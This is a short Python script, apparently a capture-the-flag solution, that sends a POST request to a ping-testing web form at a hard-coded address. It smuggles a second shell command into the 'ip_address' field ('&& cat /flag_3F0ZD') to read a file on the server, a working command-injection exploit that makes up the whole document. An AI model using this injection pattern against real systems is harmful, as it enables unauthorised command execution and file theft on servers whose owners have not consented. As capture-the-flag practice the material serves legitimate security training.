import requests

url = 'http://188.166.174.107:30572/'
data = {
    "test": "ping",
    "ip_address": "188.166.174.107 && cat /flag_3F0ZD",
    "submit": "Test",
}

r = requests.post(url, data=data)
print(r.text)
